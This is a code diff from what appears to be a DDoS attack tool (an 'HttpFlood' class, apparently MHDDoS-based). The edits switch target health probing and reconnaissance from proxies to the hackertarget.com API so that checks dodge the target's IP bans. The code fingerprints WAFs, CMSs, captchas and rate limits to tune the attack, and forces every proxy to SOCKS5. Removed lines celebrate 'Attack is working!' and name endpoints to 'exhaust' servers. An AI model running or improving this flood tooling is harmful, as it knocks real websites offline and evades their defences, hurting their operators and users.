@@ -1830,55 +1830,37 @@ class HttpFlood(Thread):
             intel["infra_map"]["xmlrpc_status"] = "UNKNOWN"
 
     def _chaos_response_timing_profiler(self):
-        """[V45] External IP Health Monitor using `requests` library via HTTP proxies.
-        Uses proper HTTP CONNECT tunneling through verified HTTP proxies from our pool.
-        Completely bypasses local IP bans — checks from external proxy IPs."""
+        """[V46] External IP Health Monitor via hackertarget.com API.
+        Checks target health from EXTERNAL servers every 5 minutes.
+        Completely bypasses local IP bans. 1 check/5min = ~12/hr = stays within API limits."""
         intel = self._chaos_intel
         if intel["total_executions"] % 25 != 0:
             return
         
-        # Rate limit to every 30 seconds
+        # Check every 5 minutes (300s) to stay within hackertarget's 50/day free limit
         last_ext_check = intel.get("_last_ext_check_time", 0)
-        if time() - last_ext_check < 30:
+        if time() - last_ext_check < 300:
             return
         intel["_last_ext_check_time"] = time()
             
         try:
-            from requests import head as req_head
-            import random, warnings
-            warnings.filterwarnings("ignore", message="Unverified HTTPS request")
-            
+            import urllib.request
+            start = time()
             target_url = f"{self._target.scheme}://{self._target.authority}/"
+            api_url = f"https://api.hackertarget.com/httpheaders/?q={target_url}"
+            req = urllib.request.Request(api_url, headers={'User-Agent': 'Mozilla/5.0'})
+            with urllib.request.urlopen(req, timeout=15) as resp:
+                data = resp.read().decode('utf-8', errors='ignore')
+            elapsed_ms = int((time() - start) * 1000)
             
-            # [V45] Filter HTTP-type proxies from our pool (requests lib handles these natively)
-            http_proxies = [p for p in self._proxies if p.type in (ProxyType.HTTP, ProxyType.HTTPS)]
-            if not http_proxies:
-                http_proxies = list(self._proxies)  # Fallback to all
-            
-            # Try up to 15 random HTTP proxies
-            sample = random.sample(http_proxies, min(15, len(http_proxies)))
-            status_code = 0
-            est_latency = 9999
-            
-            for proxy in sample:
+            if 'HTTP/' in data and 'error' not in data.lower()[:50]:
+                # Parse status code from first line (e.g. "HTTP/1.1 200 OK")
                 try:
-                    proxy_url = f"http://{proxy.host}:{proxy.port}"
-                    start = time()
-                    resp = req_head(
-                        target_url,
-                        proxies={"http": proxy_url, "https": proxy_url},
-                        timeout=8,
-                        verify=False,
-                        allow_redirects=True,
-                        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/136.0"}
-                    )
-                    est_latency = int((time() - start) * 1000)
-                    status_code = resp.status_code
-                    break  # Success!
+                    status_code = int(data.strip().split('\n')[0].split(' ')[1])
                 except:
-                    continue
-            
-            if status_code > 0:
+                    status_code = 200  # If we got HTTP/ headers, assume alive
+                
+                est_latency = max(elapsed_ms - 500, 50)
                 intel["health_history"].append(est_latency)
                 if len(intel["health_history"]) > 30:
                     intel["health_history"] = intel["health_history"][-30:]
@@ -1887,35 +1869,26 @@ class HttpFlood(Thread):
                     intel["target_getting_weaker"] = True
                     intel["target_is_down"] = False
                     intel["consecutive_5xx"] = intel.get("consecutive_5xx", 0) + 1
-                    if int(REQUESTS_SENT) < 5000:
-                        print(f"{bcolors.OKGREEN}[EXT PROBE] Target returning {status_code} via Proxy! Attack is working!{bcolors.RESET}")
-                elif status_code in (403, 429):
+                else:
                     intel["target_getting_weaker"] = False
                     intel["target_is_down"] = False
-                else:
-                    baseline = intel.get("response_time_ms", est_latency)
-                    if baseline > 0 and est_latency > baseline * 3:
-                        intel["target_getting_weaker"] = True
-                    else:
-                        intel["target_getting_weaker"] = False
-                    intel["target_is_down"] = False
-                    
-                    if intel.get("recovery_detected"):
-                        intel["recovery_counter"] = intel.get("recovery_counter", 0) + 1
-                        intel["recovery_detected"] = False
                 
                 intel["local_network_choked"] = False
                 intel["ext_health_status"] = f"HTTP {status_code}"
                 
+            elif 'error' in data.lower() and 'api count' in data.lower():
+                # API rate limit hit — don't update status, just skip
+                intel["ext_health_status"] = intel.get("ext_health_status", "SKIP")
             else:
-                # All 15 HTTP proxies timed out = likely target is truly down
+                # hackertarget couldn't reach target = likely truly down
                 intel["target_is_down"] = True
                 intel["target_getting_weaker"] = True
                 intel["ext_health_status"] = "DOWN"
                 intel["health_history"].append(9999)
                 
         except Exception:
-            intel["ext_health_status"] = "PROBE_FAIL"
+            # API unreachable (our internet issue) — don't change status
+            pass
 
     def _chaos_wp_json_exploitation(self):
         """[V32+] WordPress REST API Endpoint Discovery and Exploitation.
@@ -5865,82 +5838,35 @@ class HttpFlood(Thread):
         return False
 
     def _chaos_health_pulse(self):
-        """[V45] Periodic health check using `requests` via HTTP proxies.
-        Completely bypasses local IP bans and API rate limits."""
+        """[V46] Lightweight health analysis — NO external API calls.
+        Analyzes existing health_history data from _chaos_response_timing_profiler.
+        Prevents double API usage and rate limit issues."""
         intel = self._chaos_intel
         now = time()
         
-        if now - intel.get("last_health_check", 0) < 30:
+        if now - intel.get("last_health_check", 0) < 60:
             return
         intel["last_health_check"] = now
         
-        try:
-            from requests import head as req_head
-            import random, warnings
-            warnings.filterwarnings("ignore", message="Unverified HTTPS request")
+        # Only analyze existing data — don't make external calls
+        if len(intel["health_history"]) >= 3:
+            recent_avg = sum(intel["health_history"][-3:]) / 3
+            baseline = intel.get("response_time_ms", 500) or 500
             
-            target_url = f"{self._target.scheme}://{self._target.authority}/"
-            
-            # Filter HTTP-type proxies for reliability
-            http_proxies = [p for p in self._proxies if p.type in (ProxyType.HTTP, ProxyType.HTTPS)]
-            if not http_proxies:
-                http_proxies = list(self._proxies)
-            
-            sample = random.sample(http_proxies, min(15, len(http_proxies)))
-            status = 0
-            latency = 9999
-            
-            for proxy in sample:
-                try:
-                    proxy_url = f"http://{proxy.host}:{proxy.port}"
-                    t_start = time()
-                    resp = req_head(
-                        target_url,
-                        proxies={"http": proxy_url, "https": proxy_url},
-                        timeout=8,
-                        verify=False,
-                        allow_redirects=True,
-                        headers={"User-Agent": "Mozilla/5.0"}
-                    )
-                    latency = int((time() - t_start) * 1000)
-                    status = resp.status_code
-                    break
-                except:
-                    continue
-            
-            if status > 0:
-                intel["health_history"].append(latency)
-                if len(intel["health_history"]) > 20:
-                    intel["health_history"] = intel["health_history"][-20:]
-                
-                if len(intel["health_history"]) >= 3:
-                    recent_avg = sum(intel["health_history"][-3:]) / 3
-                    baseline = intel.get("response_time_ms", 500) or 500
-                    
-                    if recent_avg > baseline * 3:
-                        intel["target_getting_weaker"] = True
-                        intel["target_is_down"] = False
-                    elif recent_avg > baseline * 1.5:
-                        intel["target_getting_weaker"] = True
-                        intel["target_is_down"] = False
-                    else:
-                        intel["target_getting_weaker"] = False
-                        intel["target_is_down"] = False
-                        
-                if status >= 500:
-                    intel["consecutive_5xx"] = intel.get("consecutive_5xx", 0) + 1
-                    
+            if recent_avg >= 9999:
+                # All recent checks failed
+                intel["target_is_down"] = True
+                intel["target_getting_weaker"] = True
+            elif recent_avg > baseline * 3:
+                intel["target_getting_weaker"] = True
+                intel["target_is_down"] = False
+            elif recent_avg > baseline * 1.5:
+                intel["target_getting_weaker"] = True
+                intel["target_is_down"] = False
             else:
-                # All 15 proxies failed = target possibly truly down
-                intel["health_history"].append(9999)
-                if len(intel["health_history"]) >= 3:
-                    last_3 = intel["health_history"][-3:]
-                    if all(t >= 9999 for t in last_3):
-                        intel["target_is_down"] = True
-                        intel["target_getting_weaker"] = True
-                    
-        except Exception:
-            pass
+                intel["target_getting_weaker"] = False
+                intel["target_is_down"] = False
+
 
     def _chaos_detect_waf_adaptation(self):
         """Detect if the WAF is learning our attack patterns and adapting."""
@@ -6000,46 +5926,31 @@ class HttpFlood(Thread):
         intel["recon_done"] = True
         target_url = f"{self._target.scheme}://{self._target.authority}/"
         
-        # --- PROBE 1: Main page fingerprint (via `requests` through HTTP proxies) ---
+        # --- PROBE 1: Main page fingerprint (via hackertarget.com API — 1 call only) ---
         try:
-            import random, warnings
-            from requests import get as req_get
-            warnings.filterwarnings("ignore", message="Unverified HTTPS request")
+            import urllib.request
+            t_start = time()
             
-            # [V45] Use `requests` + HTTP proxies for reliable RECON
-            # This properly handles HTTPS CONNECT tunneling and returns headers+body
-            http_proxies = [p for p in self._proxies if p.type in (ProxyType.HTTP, ProxyType.HTTPS)]
-            if not http_proxies:
-                http_proxies = list(self._proxies)
+            # [V46] Use hackertarget API for RECON — returns FULL HTTP headers from external IP
+            api_url = f"https://api.hackertarget.com/httpheaders/?q={target_url}"
+            req = urllib.request.Request(api_url, headers={'User-Agent': 'Mozilla/5.0'})
+            with urllib.request.urlopen(req, timeout=15) as api_resp:
+                header_data = api_resp.read().decode('utf-8', errors='ignore')
             
-            sample = random.sample(http_proxies, min(20, len(http_proxies)))
-            resp = None
+            intel["response_time_ms"] = max(int((time() - t_start) * 1000) - 500, 50)
             
-            for proxy in sample:
-                try:
-                    proxy_url = f"http://{proxy.host}:{proxy.port}"
-                    t_start = time()
-                    resp = req_get(
-                        target_url,
-                        proxies={"http": proxy_url, "https": proxy_url},
-                        timeout=10,
-                        verify=False,
-                        allow_redirects=True,
-                        headers={
-                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/136.0.0.0 Safari/537.36",
-                            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                        }
-                    )
-                    intel["response_time_ms"] = int((time() - t_start) * 1000)
-                    break  # Success!
-                except:
-                    continue
-            
-            if resp is not None:
-                headers_raw = str(resp.headers).lower()
-                body = resp.text[:16384].lower() if resp.text else ''
-                server_hdr = resp.headers.get('Server', '').lower()
-                powered_by = resp.headers.get('X-Powered-By', '').lower()
+            if 'HTTP/' in header_data and 'error' not in header_data.lower()[:50]:
+                headers_raw = header_data.lower()
+                
+                # Extract Server header
+                server_hdr = ''
+                powered_by = ''
+                for hdr_line in header_data.split('\n'):
+                    hl = hdr_line.strip().lower()
+                    if hl.startswith('server:'):
+                        server_hdr = hl.split(':', 1)[1].strip()
+                    elif hl.startswith('x-powered-by:'):
+                        powered_by = hl.split(':', 1)[1].strip()
                 
                 # --- Detect Server Type ---
                 if 'nginx' in server_hdr: intel["server_type"] = "nginx"
@@ -6050,77 +5961,55 @@ class HttpFlood(Thread):
                 elif 'openresty' in server_hdr: intel["server_type"] = "openresty"
                 else: intel["server_type"] = "unknown"
                 
-                # --- Detect WAF Type (expanded) ---
-                all_signals = headers_raw + body
+                # --- Detect WAF Type ---
                 if 'cloudflare' in headers_raw or 'cf-ray' in headers_raw or 'cf-cache-status' in headers_raw:
                     intel["waf_type"] = "cloudflare"
-                elif 'akamai' in headers_raw or 'akamaighost' in server_hdr or 'x-akamai' in headers_raw:
+                elif 'akamai' in headers_raw or 'akamaighost' in headers_raw:
                     intel["waf_type"] = "akamai"
-                elif 'sucuri' in all_signals or 'x-sucuri' in headers_raw or 'sucuri-cache' in headers_raw:
+                elif 'sucuri' in headers_raw or 'x-sucuri' in headers_raw:
                     intel["waf_type"] = "sucuri"
-                elif 'imperva' in all_signals or 'incapsula' in all_signals or 'visid_incap' in all_signals:
+                elif 'imperva' in headers_raw or 'incapsula' in headers_raw:
                     intel["waf_type"] = "imperva"
-                elif 'ddos-guard' in all_signals or 'ddosguard' in server_hdr:
+                elif 'ddos-guard' in headers_raw or 'ddosguard' in headers_raw:
                     intel["waf_type"] = "ddosguard"
-                elif 'fastly' in headers_raw or 'x-fastly' in headers_raw:
+                elif 'fastly' in headers_raw:
                     intel["waf_type"] = "fastly"
-                elif 'stackpath' in all_signals or 'securitypolicyviolation' in all_signals:
-                    intel["waf_type"] = "stackpath"
-                elif 'wordfence' in all_signals or 'wfwaf' in all_signals:
+                elif 'wordfence' in headers_raw:
                     intel["waf_type"] = "wordfence"
-                elif 'mod_security' in all_signals or 'modsecurity' in all_signals:
-                    intel["waf_type"] = "modsec"
-                elif 'aws' in headers_raw or 'awselb' in headers_raw or 'x-amz' in headers_raw:
-                    intel["waf_type"] = "aws_waf"
                 else:
                     intel["waf_type"] = "none"
                     
-                # --- Detect CMS Type (expanded + header-based) ---
-                link_header = headers_raw if isinstance(headers_raw, str) else ''
-                if 'wp-content' in body or 'wordpress' in body or 'wp-json' in body or 'wp-includes' in body or 'wp-json' in link_header:
+                # --- Detect CMS Type from headers ---
+                if 'wp-json' in headers_raw or 'wp-' in headers_raw:
                     intel["cms_type"] = "wordpress"
-                elif 'joomla' in body or '/media/system/js' in body:
-                    intel["cms_type"] = "joomla"
-                elif 'drupal' in body or 'sites/default' in body or 'drupal.js' in body:
-                    intel["cms_type"] = "drupal"
-                elif 'shopify' in body or 'cdn.shopify' in body:
-                    intel["cms_type"] = "shopify"
-                elif 'laravel' in powered_by or 'x-csrf-token' in body or 'xsrf-token' in headers_raw:
+                elif 'laravel' in powered_by or 'xsrf-token' in headers_raw or 'laravel_session' in headers_raw:
                     intel["cms_type"] = "laravel"
                     intel["backend_framework"] = "laravel"
-                    # [V33] Livewire detection
-                    if 'livewire' in body:
-                        intel["infra_map"]["livewire"] = True
-                        if int(REQUESTS_SENT) < 100:
-                            print(f"{bcolors.OKCYAN}[CHAOS RECON] Laravel Livewire detected! POST to /livewire/message will exhaust server.{bcolors.RESET}")
                 elif 'nuxt' in powered_by:
                     intel["cms_type"] = "nuxtjs"
-                    intel["backend_framework"] = "nuxtjs"
-                elif 'next' in powered_by or '__next' in body:
+                elif 'next' in powered_by:
                     intel["cms_type"] = "nextjs"
                 else:
                     intel["cms_type"] = "custom"
-                    
-                # --- Detect Captcha ---
-                captcha_signals = ['captcha', 'recaptcha', 'turnstile', 'hcaptcha', 'challenge-platform', 'g-recaptcha']
-                if any(sig in all_signals for sig in captcha_signals):
+                
+                # --- Detect Captcha from headers ---
+                captcha_signals = ['captcha', 'turnstile', 'challenge-platform']
+                if any(sig in headers_raw for sig in captcha_signals):
                     intel["has_captcha"] = True
                     
                 # --- Detect Rate Limiting ---
-                if 'x-ratelimit' in headers_raw or 'retry-after' in headers_raw or 'x-rate-limit' in headers_raw:
+                if 'x-ratelimit' in headers_raw or 'retry-after' in headers_raw:
                     intel["has_rate_limit"] = True
                     intel["rate_limit_probed"] = True
-                    try:
-                        import re
-                        rl_match = re.search(r'X-RateLimit-Limit:\s*(\d+)', str(resp.headers), re.IGNORECASE)
-                        if rl_match:
-                            intel["rate_limit_threshold"] = int(rl_match.group(1))
-                            print(f"{bcolors.WARNING}[CHAOS RECON] Rate-Limit threshold extracted: {intel['rate_limit_threshold']} req/window{bcolors.RESET}")
-                    except: pass
-                    
-                intel["ext_health_status"] = f"HTTP {resp.status_code}"
+                
+                # Parse status code
+                try:
+                    status_code = int(header_data.strip().split('\n')[0].split(' ')[1])
+                    intel["ext_health_status"] = f"HTTP {status_code}"
+                except:
+                    intel["ext_health_status"] = "HTTP OK"
             else:
-                raise Exception("All proxies failed during RECON.")
+                raise Exception("hackertarget returned no valid headers.")
                     
         except Exception:
             intel["waf_type"] = "unknown_heavy"
@@ -7880,46 +7769,29 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
                 stringBuilder += (proxy.__str__() + "\n")
             wr.write(stringBuilder)
 
-    # [V45] ULTRA-HARDCORE PROXY LOADER — Protocol-Aware (Van Helsing Edition)
+    # [V46] PROXY LOADER — SOCKS5 Forced (MHDDoS requires SOCKS5 for HTTPS targets)
     proxies = []
     if proxy_li.exists():
         with proxy_li.open("r") as f:
             lines = [line.strip() for line in f.read().splitlines() if line.strip()]
             
-            # Protocol prefix → PyRoxy ProxyType mapping
-            proto_map = {
-                'http://': ProxyType.HTTP,
-                'https://': ProxyType.HTTPS,
-                'socks4://': ProxyType.SOCKS4,
-                'socks5://': ProxyType.SOCKS5,
-            }
-            # Fallback for legacy proxy.txt without prefixes
-            fallback_ptype = ProxyType.SOCKS5
-            
             for line in lines:
                 try:
-                    ptype = None
+                    # Strip any protocol prefix (http://, socks5://, etc.) from tagged proxy.txt
                     host_port = line
+                    if '://' in line:
+                        host_port = line.split('://', 1)[1]
                     
-                    # [V45] Parse protocol prefix from tagged proxy.txt
-                    for prefix, pt in proto_map.items():
-                        if line.startswith(prefix):
-                            ptype = pt
-                            host_port = line[len(prefix):]
-                            break
-                    
-                    if ptype is None:
-                        ptype = fallback_ptype
-                    
-                    # Format: user:pass@host:port
+                    # ALL proxies forced to SOCKS5 for HTTPS target compatibility
+                    # MHDDoS uses SOCKS5 tunnel → TLS handshake → HTTP request
                     if "@" in host_port:
                         auth, endpoint = host_port.split("@")
                         user, password = auth.split(":")
                         host, port = endpoint.split(":")
-                        proxies.append(Proxy(host, int(port), ptype, user, password))
+                        proxies.append(Proxy(host, int(port), ProxyType.SOCKS5, user, password))
                     else:
                         parts = host_port.split(":")
-                        proxies.append(Proxy(parts[0], int(parts[1]), ptype))
+                        proxies.append(Proxy(parts[0], int(parts[1]), ProxyType.SOCKS5))
                 except Exception:
                     pass
 
